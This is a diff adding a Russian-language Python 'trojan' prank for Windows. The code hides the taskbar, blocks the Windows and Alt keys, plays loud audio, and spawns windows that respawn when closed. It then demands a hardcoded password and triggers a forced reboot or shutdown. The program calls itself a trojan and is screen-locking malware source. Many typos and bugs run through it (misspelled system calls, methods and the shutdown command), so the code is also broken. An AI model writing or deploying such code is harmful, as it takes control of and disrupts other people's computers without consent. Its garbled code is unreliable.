@@ -1,0 +1,87 @@
+import tkinter as tk 
+from tkinter import simpledialog, messagebox
+import pygame
+import keyboard
+import ctypes 
+import os   
+
+def diable_taskbar():
+    try:
+        handle= ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+        ctypes.windll.user32.ShowWindow(handle,0)
+    except Exception as e:
+        print("Ошибка:" , e)
+diable_taskbar()
+
+def block_win_key(event):
+    if event.name=='left windows' or event.name=='right windows':
+        return False
+def block_alt_key(event):
+    if event.name=='alt':
+        return False
+    
+keyboard.hook(block_alt_key)
+keyboard.hook(block_win_key)
+pygame.mixer.init()
+
+sound_file=pygame.mixer.Sound('files/sound.waf')
+music_file= 'files/music.wav'
+
+pygame.mixer.music.load(music_file)
+pygame.mixer.music.play()
+pygame.mixer.set_endevent(pygame.constants.USEREVENT)
+
+count_windows=0
+def set_wallpaper(image_path):
+    SPI_SETDESKWALLPAPER=20
+    ctypes.windll.user32.SystemParameteresInfow(SPI_SETDESKWALLPAPER)
+
+def create_window():
+    global count_windows
+    count_windows +=1
+
+    if count_windows==20:
+        password=simpledialog.askstring("Пароль", "Введите пароль:" ,show="*")
+
+        if password=='123':
+            os.system("shutsown /r /t 25")
+            messagebox.showinfo("Поздравляю!","ты удалили троян не обижайся ")
+        else:
+            messagebox.showwarning("Ошибка","Пароль неверный ")
+            os.systemO("shutsown /s /t 180 ")
+            messagebox.showerror("Варнинг", "Пароль неверный"
+                                 "твоой Пк будет перезапущен через 3 минуты \n"
+                                 "А почка что ...")
+    window=tk.Toplevel(root)
+    window.title("Пельмены варить!")
+    window.geometry("1600x900")
+    window.protocol("WW_DELETE_WINDOW",create_multiple_windows )
+    sound_file.set_volume(15.0)
+    sound_file.play
+def create_multiple_windows():
+    num_windows=len(root.winfo_childer())
+
+    if num_windows<1000000:
+        for numwindow in range(num_windows):
+            create_window()
+def set_wallpaper_from_folder(folder_path):
+    image_files=[f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path,f))]
+
+    if image_files:
+        image_files=os.path.join(folder_path,image_files[0])
+        set_wallpaper(image_path)
+    else:
+        messagebox.showwarning("Ошибка","папке нет иображний!")
+
+walpaper_folder='files/images/'
+if os.path.isdit(walpaper_folder):
+    set_wallpaper_from_folder(walpaper_folder)
+else:
+    messagebox.showwarning("Ошибка","указанный путь не яявляется действительним ")
+
+root=tk.Tk()
+root.geometry("1600x900")
+root.protocol("WM_DELETE_WINDOW",create_multiple_windows)
+
+create_window()
+root.mainloop()
